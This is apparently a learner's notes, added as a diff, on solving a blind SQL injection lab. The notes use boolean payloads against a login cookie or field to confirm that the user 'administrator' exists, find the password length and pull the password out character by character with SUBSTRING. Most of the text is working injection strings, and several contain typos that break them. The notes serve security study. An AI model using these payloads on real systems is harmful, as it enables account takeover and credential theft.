@@ -1,0 +1,46 @@
+password guessed: x1__b______gi__f___
+
+
+xys' : doen't contain a "welcome back" msg in HTTP response
+
+We can also use OR but you must know the logical AND & OR operation differences.
+
+xyz' AND 1=1-- : contain a "welcome back" msg in HTTP response
+
+checked if username 'administrator' is exits:
+
+xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a'-- : "welcome back" msg present
+
+xyz' AND (SELEDT 'a' FROM users WHERE username='administrator')='b'-- : in this we are selecting char 'a' from username and comparing with char 'b' it doesn't math so it will doesn't show the msg
+we need to compare with same char on both places.
+
+gessing a lenght of password
+
+xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>5)='a'-- : response contain the welcome back msg because password lenght is grether than 5.
+
+the conditions lenght(password)>5 is true and selecting a from users where username is administrator = a is true so it will return a true means "welcome back msg.
+
+check untile you gess the right password lentht by increasing a digit
+
+xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGHT(password)>21)='a'-- : response doesn't contain "welcome back" msg.
+
+finel check if passowrd lenght is equal to 20:
+
+xyz' AND (SELECT 'a' FROM uses WHERE username='administrator' AND LENGHT(password)=20)='a'-- : response contain "welcome back" msg
+
+now we need to find the actual password of length 20 so we can use SUBSTRING(password, position,charcount) and compair it with each possible char and numbers.
+
+xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND SUBSTRING(password,1,1)='x')='a'-- it works and i have first position of password is 'x' now i need to guess more 19 positions 
+
+for second position we can modify the payload like following:
+
+xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND SUBSTRING(password,2,1)='x')='a'--
+
+or we can use this payload also:
+
+xyz' AND SUBSTRING((SELECT password FROM users WHERE username='administrator')1,1)='x'-- : it also works perfectly
+
+check the second position response
+
+
+now guess the remaing positions and log in as administrator and your lab is solved...
